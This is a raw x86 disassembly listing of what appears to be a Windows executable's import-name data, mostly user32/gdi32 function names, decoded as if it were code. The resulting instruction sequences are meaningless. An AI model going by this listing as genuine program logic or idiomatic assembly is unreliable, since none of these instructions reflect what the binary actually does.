  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
